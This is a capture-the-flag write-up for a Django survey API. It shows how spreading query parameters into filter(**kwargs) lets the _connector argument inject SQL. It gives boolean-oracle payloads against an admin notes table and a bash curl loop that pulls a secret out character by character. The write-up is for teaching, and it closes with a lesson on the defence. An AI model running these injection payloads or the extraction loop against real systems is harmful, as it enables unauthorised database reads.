# SELECT Isn't a Choice

> SurveyHub turns every query-string parameter into a Django ORM filter. The `_connector` parameter reaches the SQL generator and opens a boolean-injection oracle.
> **Flag:** `flag{ddbab8443dc2b597}`

---

## Solution

### 1. The vulnerable view

`views.py` builds the queryset straight from the request:

```python
filters = request.GET.dict()
surveys = Survey.objects.filter(**filters)
```

So every URL parameter becomes a Django lookup, including lookups that were never
meant to be user-controlled:

```text
/api/surveys/?title__icontains=a
/api/surveys/?id__regex=1
```

`models.py` also defines `AdminNote(key, value)`, unrelated to `Survey`. That is
the table worth reading.

### 2. Find the injection point

Django's `Q` objects accept a `_connector` argument, and `filter(**filters)` passes
it through to the SQL generation step. This request returns all 12 public surveys
instead of none, proving that the connector is injectable:

```text
/api/surveys/?id=999&title__icontains=zzzz&_connector=OR%201=1%20OR
```

### 3. Boolean oracle

```text
_connector=OR (SELECT value FROM surveys_adminnote LIMIT 1) LIKE '%' OR
```

If the subquery is true the API returns `count: 12`; if it is false, `count: 0`.

### 4. Extract the flag by prefix

```text
_connector=OR (SELECT value FROM surveys_adminnote LIMIT 1) GLOB 'flag{...*' OR
```

Verifying the exact value:

```text
_connector=OR (SELECT value FROM surveys_adminnote LIMIT 1) = 'flag{ddbab8443dc2b597}' OR
```

The response is true (`count: 12`).

### 5. Flag

```text
flag{ddbab8443dc2b597}
```

### New instance (current run)

The extraction loop against `https://fbebcdbfc185ce24.chal.ctf.ae`:

```bash
prefix='flag{'; charset='0123456789abcdef}'
while true; do
  found=0
  for c in $(echo $charset | sed 's/./& /g'); do
    test="${prefix}${c}"
    payload="OR (SELECT value FROM surveys_adminnote LIMIT 1) GLOB '${test}*' OR"
    out=$(curl -sk --get 'https://fbebcdbfc185ce24.chal.ctf.ae/api/surveys/' \
      --data-urlencode 'id=999' \
      --data-urlencode 'title__icontains=zzzz' \
      --data-urlencode "_connector=$payload")
    if echo "$out" | grep -q '"count": 12'; then
      prefix="$test"; echo "$prefix"; found=1; break
    fi
  done
  [ "$found" -eq 0 ] && { echo "FAILED_AT $prefix"; break; }
  echo "$prefix" | grep -q '}$' && { echo "FINAL $prefix"; break; }
done
```

```text
FINAL flag{68e38666e8713e46}
```

## Lesson

Never spread request parameters into `filter(**kwargs)`. Lookup suffixes and
internal arguments such as `_connector` are part of the query language, so a
"simple search" becomes arbitrary SQL.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
